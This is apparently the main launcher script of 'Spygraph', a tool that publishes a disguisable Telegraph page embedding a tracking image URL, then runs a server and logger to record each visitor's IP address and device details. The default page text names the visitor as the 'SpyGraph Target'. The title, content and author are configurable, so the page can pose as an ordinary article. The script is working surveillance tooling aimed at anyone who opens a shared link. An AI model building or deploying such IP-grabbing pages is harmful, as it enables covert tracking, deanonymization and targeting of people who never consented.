import os
import sys
import tempfile
import time
from multiprocessing import Process, Queue
from signal import SIGINT, SIGTERM, signal

from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

from spygraph.core.telegraph import Grapher
from spygraph.workers.logger import process_logs
from spygraph.workers.runner import run_api


from typing import Optional

def main(
    host: str = "0.0.0.0",
    port: int = 8000,
    telegraph_token: Optional[str] = None,
    tracking_domain: Optional[str] = None,
    domain_graph: Optional[str] = None,
    page_title: Optional[str] = None,
    page_content: Optional[str] = None,
    page_author: Optional[str] = None,
    ssl_cert: Optional[str] = None,
    ssl_key: Optional[str] = None,
):
    console = Console()

    import uuid as uuid_module

    static_uuid = str(uuid_module.uuid4())

    init_content = Text()
    init_content.append("  ◆ Initializing Spygraph server\n", style="bold magenta")
    panel = Panel(
        init_content,
        title="SPYGRAPH STARTUP",
        box=box.ROUNDED,
        border_style="magenta",
        expand=False,
    )
    console.print(panel)
    console.print()

    if telegraph_token:
        try:
            console.print("[magenta]Setting up Telegraph page...[/magenta]")

            grapher = Grapher(access_token=telegraph_token, domain_graph=domain_graph)

            api_host = tracking_domain if tracking_domain else f"{host}:{port}"
            track_url = f"https://{api_host}/api/v1/pictures/{static_uuid}"

            default_html = """
            <h3>SpyGraph Target</h3>
            <p>This page captures IP information and device details.</p>
            <p>Your device information is being logged.</p>
            """

            content_path = page_content
            tmp_html_path = None
            if not content_path:
                with tempfile.NamedTemporaryFile(
                    mode="w", suffix=".html", delete=False
                ) as tmp:
                    tmp.write(default_html)
                    tmp_html_path = tmp.name
                content_path = tmp_html_path

            content_path_obj = os.path.expanduser(content_path)

            try:
                page_result = grapher.create_page(
                    content_file_path=content_path_obj,
                    track_url=track_url,
                    title=page_title,
                    author=page_author or "SpyGraph",
                )

                telegraph_url = page_result["url"]

                telegraph_content = Text()
                telegraph_content.append(
                    "  ◆ Telegraph page created\n", style="magenta"
                )
                telegraph_content.append(
                    f"    ◦ URL: {telegraph_url}\n", style="magenta"
                )
                if tracking_domain:
                    telegraph_content.append(
                        f"    ◦ Domain: {tracking_domain}\n", style="magenta"
                    )
                else:
                    telegraph_content.append(
                        f"    ◦ Domain: {api_host}\n", style="magenta"
                    )

                telegraph_panel = Panel(
                    telegraph_content,
                    title="TELEGRAPH",
                    box=box.ROUNDED,
                    border_style="magenta",
                    expand=False,
                )
                console.print(telegraph_panel)
                console.print()
            finally:
                if tmp_html_path and os.path.exists(tmp_html_path):
                    os.unlink(tmp_html_path)

        except Exception as e:
            error_content = Text(f"  Error: {e}\n", style="magenta")
            error_panel = Panel(
                error_content,
                title="ERROR",
                box=box.ROUNDED,
                border_style="magenta",
                expand=False,
            )
            console.print(error_panel)
            sys.exit(1)

    config_content = Text()
    config_content.append("  ◆ Configuration\n", style="magenta")
    config_content.append(f"    ◦ Host: {host}\n", style="magenta")
    config_content.append(f"    ◦ Port: {port}\n", style="magenta")
    config_content.append(f"    ◦ UUID: {static_uuid}\n", style="magenta")

    config_panel = Panel(
        config_content,
        title="SERVER",
        box=box.ROUNDED,
        border_style="magenta",
        expand=False,
    )
    console.print(config_panel)
    console.print()

    queue = Queue()

    api_process = Process(
        target=run_api,
        args=(queue, host, port, ssl_cert, ssl_key, static_uuid),
        daemon=False,
    )
    logger_process = Process(target=process_logs, args=(queue,), daemon=False)

    shutdown_state = {"interrupt_count": 0, "graceful": False}

    def handle_interrupt(sig, frame):
        shutdown_state["interrupt_count"] += 1

        if shutdown_state["interrupt_count"] == 1:
            shutdown_state["graceful"] = True
            shutdown_content = Text(
                "  ◆ Graceful shutdown initiated\n  ◦ Press Ctrl+C again to force\n",
                style="bold magenta",
            )
            shutdown_panel = Panel(
                shutdown_content,
                title="SHUTDOWN",
                box=box.ROUNDED,
                border_style="magenta",
                expand=False,
            )
            console.print(shutdown_panel)
        else:
            force_content = Text("  ◆ Force shutdown\n", style="bold magenta")
            force_panel = Panel(
                force_content,
                title="FORCED",
                box=box.ROUNDED,
                border_style="magenta",
                expand=False,
            )
            console.print(force_panel)
            api_process.kill()
            logger_process.kill()
            sys.exit(0)

    signal(SIGINT, handle_interrupt)
    signal(SIGTERM, handle_interrupt)

    logger_process.start()
    time.sleep(0.5)
    api_process.start()

    graceful_done = False

    try:
        while True:
            if not api_process.is_alive():
                break

            if shutdown_state["graceful"] and not graceful_done:
                graceful_done = True
                console.print("[magenta]Terminating processes...[/magenta]")
                api_process.terminate()
                for _ in range(50):
                    if not api_process.is_alive():
                        break
                    time.sleep(0.1)

                if api_process.is_alive():
                    console.print("[magenta]Forcing termination...[/magenta]")
                    api_process.kill()

            time.sleep(0.1)

        api_process.join(timeout=2)

        time.sleep(0.5)
        logger_process.terminate()
        logger_process.join(timeout=2)

        if logger_process.is_alive():
            logger_process.kill()

        console.print("[magenta]Shutdown complete[/magenta]")

    except KeyboardInterrupt:
        handle_interrupt(None, None)
    except Exception as e:
        error_content = Text(f"  Unexpected error: {e}\n", style="magenta")
        error_panel = Panel(
            error_content,
            title="ERROR",
            box=box.ROUNDED,
            border_style="magenta",
            expand=False,
        )
        console.print(error_panel)
        api_process.kill()
        logger_process.kill()


if __name__ == "__main__":
    main()
